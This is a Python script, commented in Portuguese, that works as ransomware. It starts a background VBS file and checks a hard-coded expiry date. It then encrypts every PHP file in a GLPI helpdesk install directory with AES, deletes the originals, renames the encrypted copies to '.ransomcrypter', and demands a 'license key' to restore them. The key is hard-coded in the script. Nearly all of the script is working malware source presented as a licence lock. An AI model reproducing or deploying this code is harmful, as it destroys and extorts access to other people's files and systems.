"""

"""
import os
import glob
import time
import datetime
import pyaes





from pathlib import Path

#abre arquivo para por executavel em segundo plano

os.startfile(r"C:\Users\User\Desktop\Nova pasta (3)\background.vbs")


#comparação de datas 
data_atual = datetime.date.today()
print('data de vencimento',data_atual)
data_prevista = datetime.date(2022, 9, 18)
x=1
print('data de vencimento',data_prevista)
while x !=0  :
    if data_atual  > data_prevista :
       x=0
       print('Licença vencida')








lst_arq = ["*.php"]

print('Criptografando')
time.sleep(3)

# Entra no Desktop e faz a verificação C:\xampp\htdocs\suporte\glpi-9.1.1\glpi
try:
    desktop = Path.home() / "c://xampp/htdocs/suporte/glpi-9.1.1/glpi"
#    download = Path.home() / "Downloads"
except Exception:
    pass

os.chdir(desktop)


def criptografando():
    for files in lst_arq:
        for format_file in glob.glob(files):
            print(format_file)
            f = open(f'{desktop}\\{format_file}', 'rb')
            file_data = f.read()
            f.close()

            os.remove(f'{desktop}\\{format_file}')
            key = b"1ab2c3e4f5g6h7i8"  # 16 byts key - chave
            aes = pyaes.AESModeOfOperationCTR(key)
            crypto_data = aes.encrypt(file_data)

            # Salvando arquivo novo (.ransomcrypter)

            new_file = format_file + ".ransomcrypter"
            new_file = open(f'{desktop}\\{new_file}', 'wb')
            new_file.write(crypto_data)
            new_file.close()


def descrypt(decrypt_file):
    try:
        for file in glob.glob('*.ransomcrypter'):

            keybytes = decrypt_file.encode()
            name_file = open(file, 'rb')
            file_data = name_file.read()
            dkey = keybytes  # 16 bytes key - change for your key
            daes = pyaes.AESModeOfOperationCTR(dkey)
            decrypt_data = daes.decrypt(file_data)

            format_file = file.split('.')
            new_file_name = format_file[0] + '.' + format_file[1]  # Path to drop file

            dnew_file = open(f'{desktop}\\{new_file_name}', 'wb')
            dnew_file.write(decrypt_data)
            dnew_file.close()
    except ValueError as err:
        print('Chave inválida')


if __name__ == '__main__':
    criptografando()
    y=1
while y != 0 :
    if criptografando:
        key = input('Sua licença esta vencida informe a chave  para liberar os arquivos:')
        if key == '1ab2c3e4f5g6h7i8':
            descrypt(key)
            for del_file in glob.glob('*.ransomcrypter'):
                os.remove(f'{desktop}\\{del_file}')
                y=0
                print('chave de liberação correta ')
        else:
            print('Chave de liberação inválida!!!')